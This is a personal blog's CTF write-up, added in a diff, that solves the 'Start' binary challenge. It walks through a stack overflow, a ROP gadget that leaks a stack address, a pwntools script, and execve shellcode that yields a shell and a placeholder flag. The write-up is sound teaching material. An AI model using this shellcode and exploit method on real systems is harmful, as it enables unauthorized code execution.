@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>
+  Start · Lucas Ball
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="Lucas Ball">
+<meta name="description" content="Alright so my first steps were to download the binary and open it up in ghidra. Opening it up in ghidra yielded nothing because the program was a super basic opcodes. With no libraries. This made it really hard for ghidra to figure out what the functions were really doing. This meant I would have to open it up in GDB to see what was happening in the dissassembly.
+I first ran the program to see what it did.">
+<meta name="keywords" content="blog,cybersecurity,infosec,personal,pwn">
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Start"/>
+<meta name="twitter:description" content="Alright so my first steps were to download the binary and open it up in ghidra. Opening it up in ghidra yielded nothing because the program was a super basic opcodes. With no libraries. This made it really hard for ghidra to figure out what the functions were really doing. This meant I would have to open it up in GDB to see what was happening in the dissassembly.
+I first ran the program to see what it did."/>
+
+<meta property="og:title" content="Start" />
+<meta property="og:description" content="Alright so my first steps were to download the binary and open it up in ghidra. Opening it up in ghidra yielded nothing because the program was a super basic opcodes. With no libraries. This made it really hard for ghidra to figure out what the functions were really doing. This meant I would have to open it up in GDB to see what was happening in the dissassembly.
+I first ran the program to see what it did." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lucasball.com/write-ups/pwnable/start/" /><meta property="article:section" content="write-ups" />
+<meta property="article:published_time" content="2023-01-27T19:46:10-08:00" />
+<meta property="article:modified_time" content="2023-01-27T19:46:10-08:00" />
+
+
+
+
+<link rel="canonical" href="https://lucasball.com/write-ups/pwnable/start/">
+
+
+<link rel="preload" href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.min.65236a6d834b26194eed04a2a3b45e44d9194ef9e620253705d4bef03bd7ef81.css" integrity="sha256-ZSNqbYNLJhlO7QSio7ReRNkZTvnmICU3BdS&#43;8DvX74E=" crossorigin="anonymous" media="screen" />
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.min.f6534b0b446b75d9b6ad77a97d43ede2ddaeff1b6e2361fb7198d6f8fcb7f83f.css" integrity="sha256-9lNLC0Rrddm2rXepfUPt4t2u/xtuI2H7cZjW&#43;Py3&#43;D8=" crossorigin="anonymous" media="screen" />
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      Lucas Ball
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/homelab">Homelab</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/mywork">My Work</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/images/resume.pdf">Resume</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/write-ups/">Write-Ups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/contact/">Contact</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container page">
+  <article>
+    <header>
+      <h1 class="title">
+        <a class="title-link" href="https://lucasball.com/write-ups/pwnable/start/">
+          Start
+        </a>
+      </h1>
+    </header>
+
+    <p>Alright so my first steps were to download the binary and open it up in ghidra. Opening it up in ghidra yielded nothing because the program was a super basic opcodes. With no libraries. This made it really hard for ghidra to figure out what the functions were really doing. This meant I would have to open it up in GDB to see what was happening in the dissassembly.</p>
+<p>I first ran the program to see what it did. All it did was send a 20-byte message:
+<code>Let's start the CTF:</code>
+then it gave a prompt. It seemed like anything you sent in the prompt would exit the program.</p>
+<p>I opened the binary in GDB to find exactly that. Looking at the functions I found &ldquo;_start&rdquo; was where all the magic happened. It was very crude instructions in 32-bit. It looked a little bit like this:</p>
+<p><img src="https://user-images.githubusercontent.com/63262961/149428905-e619f0ad-0fd7-48ad-981c-3a42d0d86ae1.png" alt="Pasted image 20220113144304"></p>
+<p>I was interested in this part:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>xor ebx,ebx
+</span></span><span style="display:flex;"><span>mov dl,0x3c
+</span></span><span style="display:flex;"><span>mov al,0x3
+</span></span><span style="display:flex;"><span>int 0x80
+</span></span></code></pre></div><p>This essentially called <code>read(0, ???, 0x3c)</code>
+The ??? was confusing, but then I read up above <code>mov ecx,esp</code> which meant that ecx was representing the stack, so it would be <code>read(0, stack, 0x3c)</code>
+This meant there was an easy buffer overflow, but not as easy as I originally imagined. Essentially the stack looked like this:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0xffffbf04 ◂— 0x2774654c (&#34;Let&#39;&#34;)
+</span></span><span style="display:flex;"><span>0xffffbf08 ◂— 0x74732073 (&#39;s st&#39;)
+</span></span><span style="display:flex;"><span>0xffffbf0c ◂— 0x20747261 (&#39;art &#39;)
+</span></span><span style="display:flex;"><span>0xffffbf10 ◂— 0x20656874 (&#39;the &#39;)
+</span></span><span style="display:flex;"><span>0xffffbf14 ◂— 0x3a465443 (&#39;CTF:&#39;)
+</span></span><span style="display:flex;"><span>0xffffbf18 —▸ 0x804809d (_exit)
+</span></span></code></pre></div><p>So when the program ran it would overwrite the stack with your input up to <code>0x3c</code> bytes. So if you typed <code>blah</code> the stack would look like:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0xffffbf04 ◂— 0x68616c62 (&#34;blah&#34;)
+</span></span><span style="display:flex;"><span>0xffffbf08 ◂— 0x74732073 (&#39;s st&#39;)
+</span></span><span style="display:flex;"><span>0xffffbf0c ◂— 0x20747261 (&#39;art &#39;)
+</span></span><span style="display:flex;"><span>0xffffbf10 ◂— 0x20656874 (&#39;the &#39;)
+</span></span><span style="display:flex;"><span>0xffffbf14 ◂— 0x3a465443 (&#39;CTF:&#39;)
+</span></span><span style="display:flex;"><span>0xffffbf18 —▸ 0x804809d (_exit)
+</span></span></code></pre></div><p>This means that you would have to type 20 characters before you hit the return address.
+<code>0x3c</code> = 60 so you have 60-20 = 40 bytes of buffer overflow. Thats a good amount. I ended up looking at the ROPgadgets to see what I could do to change the control flow of the program:
+<code>$ ROPgadget --binary ./start</code></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>0x0804809b : adc al, 0xc3 ; pop esp ; xor eax, eax ; inc eax ; int 0x80
+</span></span><span style="display:flex;"><span>0x0804808e : add al, 0xcd ; xor byte ptr [ecx], 0xdb ; mov dl, 0x3c ; mov al, 3 ; int 0x80
+</span></span><span style="display:flex;"><span>0x08048099 : add esp, 0x14 ; ret
+</span></span><span style="display:flex;"><span>0x08048086 : daa ; mov ecx, esp ; mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80 0x080480a0 : inc eax ; int 0x80
+</span></span><span style="display:flex;"><span>0x0804808f : int 0x80
+</span></span><span style="display:flex;"><span>0x0804809a : les edx, ptr [ebx + eax*8] ; pop esp ; xor eax, eax ; inc eax ; int 0x80
+</span></span><span style="display:flex;"><span>0x08048095 : mov al, 3 ; int 0x80
+</span></span><span style="display:flex;"><span>0x0804808d : mov al, 4 ; int 0x80
+</span></span><span style="display:flex;"><span>0x0804808b : mov bl, 1 ; mov al, 4 ; int 0x80
+</span></span><span style="display:flex;"><span>0x08048089 : mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80
+</span></span><span style="display:flex;"><span>0x08048093 : mov dl, 0x3c ; mov al, 3 ; int 0x80
+</span></span><span style="display:flex;"><span>0x08048087 : mov ecx, esp ; mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80
+</span></span><span style="display:flex;"><span>0x0804809d : pop esp ; xor eax, eax ; inc eax ; int 0x80
+</span></span><span style="display:flex;"><span>0x0804809c : ret
+</span></span><span style="display:flex;"><span>0x08048090 : xor byte ptr [ecx], 0xdb ; mov dl, 0x3c ; mov al, 3 ; int 0x80
+</span></span><span style="display:flex;"><span>0x0804809e : xor eax, eax ; inc eax ; int 0x80
+</span></span><span style="display:flex;"><span>0x08048091 : xor ebx, ebx ; mov dl, 0x3c ; mov al, 3 ; int 0x80
+</span></span></code></pre></div><p>Seeing this I realized my options were limited, but I decided to start trying things out. The first gadget I tried was: <code>0x080480a0 : inc eax ; int 0x80</code> since I knew it would change the function that gets called. What I got was <code>0x18 + 1</code> for my eax value which corresponded to the <code>stime</code> syscall. After trying different inputs I found that eax was being saved from the <code>read</code> function which would return the size of the input. Which was <code>0x18</code>. When I increased the size of the input, I could get different syscall codes untill I reached <code>0x3c</code>(the max read size). Looking at my options for possible syscalls led to nothing. So that idea was scrapped.</p>
+<p>The next idea I had was to use shellcode in my input to run some code (maybe pop a shell). Looking at <code>vmmap</code> I realized that might be possible since the stack was executable. The addresses of the stack were randomized though, so I had to find a way to leak the stack. Looking at the ROPgadgets I saw this function:
+<code>0x08048087 : mov ecx, esp ; mov dl, 0x14 ; mov bl, 1 ; mov al, 4 ; int 0x80</code>
+Essentially this would print out 20 bytes from the stack. since we had already moved the stack pointer past the string that it gives, it would run: <code>write(1, stack, 0x14)</code> this is what my program looked like:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="font-style:italic">#! /usr/bin/env python</span>
+</span></span><span style="display:flex;"><span><span style="font-weight:bold">from</span> <span style="font-weight:bold">pwn</span> <span style="font-weight:bold">import</span> *
+</span></span><span style="display:flex;"><span>context.terminal = [<span style="font-style:italic">&#39;tmux&#39;</span>, <span style="font-style:italic">&#39;splitw&#39;</span>, <span style="font-style:italic">&#39;-h&#39;</span>]
+</span></span><span style="display:flex;"><span>addr_ecx2 = 0x08048087
+</span></span><span style="display:flex;"><span>p = process(<span style="font-style:italic">&#34;./start&#34;</span>)
+</span></span><span style="display:flex;"><span>gdb.attach(p, <span style="font-style:italic">&#39;b _start&#39;</span>)
+</span></span><span style="display:flex;"><span>p.recv()
+</span></span><span style="display:flex;"><span>payload = <span style="font-style:italic">b</span><span style="font-style:italic">&#34;A&#34;</span>*(0x14)
+</span></span><span style="display:flex;"><span>payload += p32(addr_ecx2)
+</span></span><span style="display:flex;"><span>p.send(payload)
+</span></span><span style="display:flex;"><span>x = p.recv()
+</span></span><span style="display:flex;"><span>print(hex(u32(x[0:4])))
+</span></span><span style="display:flex;"><span>print(hex(u32(x[4:8])))
+</span></span><span style="display:flex;"><span>print(hex(u32(x[8:12])))
+</span></span><span style="display:flex;"><span>p.interactive()
+</span></span></code></pre></div><p>I was able to leak 3 addresses with one of them in the same page as the stack:(<code>x[0:4]</code>)
+This was some really good news. It meant I could run shellcode directly. So I created a new program that would send Shellcode in my input and then send the program to that spot in the stack. This would be the control flow:
+<code>_start</code> -&gt; enter <code>&quot;A&quot;*0x14 + 0x08048087</code> -&gt; <code>_start+39</code> = <code>0x08048087</code> -&gt; read stack address -&gt; enter <code>shellcode + stack address</code> -&gt; <code>stack address</code>
+The program I wrote did exactly that. My shellcode looked like this:
+<code>&quot;j\x0bXhn/shh//bi1\xc9\x99T[\xcd\x80&quot;</code>
+And it didn&rsquo;t work.</p>
+<p>Why? The shellcode I thought was too long. I thought the shellcode was somehow breaking after like 10 characters. I spent an insane amount of time trying to get the shellcode to be small enough to fit into the space.
+Then I looked really hard at what was happening. The instructions from my shellcode looked like this:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>push $SYS_execve
+</span></span><span style="display:flex;"><span>pop %eax
+</span></span><span style="display:flex;"><span>push $0
+</span></span><span style="display:flex;"><span>push $0x68732f6e
+</span></span><span style="display:flex;"><span>push $0x69622f2f
+</span></span><span style="display:flex;"><span>xor %ecx, %ecx
+</span></span><span style="display:flex;"><span>cltd
+</span></span><span style="display:flex;"><span>push %esp
+</span></span><span style="display:flex;"><span>pop %ebx
+</span></span><span style="display:flex;"><span>int $0x80
+</span></span></code></pre></div><p>I noticed that when the program got to <code>push $0x69622f2f</code> it would overwrite the rest of the shellcode. OF COURSE!!! The shellcode was on the stack and pushing values onto the stack would overwrite those values.</p>
+<p>All I had to do to solve it was place the shellcode at the end of my input so it would overwrite useless parts of the stack and boom! it worked:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>bin boot dev etc home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var
+</span></span><span style="display:flex;"><span>$ cd home
+</span></span><span style="display:flex;"><span>$ cd start
+</span></span><span style="display:flex;"><span>$ ls
+</span></span><span style="display:flex;"><span>flag
+</span></span><span style="display:flex;"><span>run.sh
+</span></span><span style="display:flex;"><span>start
+</span></span><span style="display:flex;"><span>$ cat flag
+</span></span><span style="display:flex;"><span>FLAG{EXAMPLE_FLAG}
+</span></span></code></pre></div><p>The final expoit script is in this repo.</p>
+
+  </article>
+</section>
+
+  
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2023
+     Lucas Ball 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+
+</html>
